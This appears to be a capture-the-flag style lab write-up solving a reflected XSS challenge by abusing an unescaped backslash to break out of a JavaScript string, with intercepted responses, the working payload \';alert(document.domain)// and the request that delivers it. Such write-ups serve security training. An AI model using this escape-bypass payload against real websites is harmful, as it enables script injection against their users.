### Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.

To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.

_____

Analysis and Exploit:

1. Performed a test serch using the string **'\<"test1">**, intercepted the response and the embedded Javascript is:

```html
<script>
    var searchTerms = '\'&lt;&quot;test1&quot;&gt;';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

The single quote is escaped while angle brackets and double quotes are HTML-encoded.

2. Performed a second test search using the string **'\<"test1">**, intercepted the response

```html
<script>
    var searchTerms = '\\'&lt;&quot;test1&quot;&gt;';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

The backslash added by the filter on user input used to escape single quotes is not escaped so the backslash in the test string escapes the one added by the filter.  
This means that the single is no longer escaped and the script syntax is broken because every semicolon is interpreted as a Javascript statement terminator.

3. Used the payload ```\';alert(document.domain)//``` to exploit the Reflected XSS vulnerability

```html
<script>
    var searchTerms = '\\';alert(document.domain)//';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

_____

Script notes:

3. GET ```/?search=\';alert(document.domain)//```

If "Congratulations, you solved the lab!" in the response, the exploit worked and the lab is solved.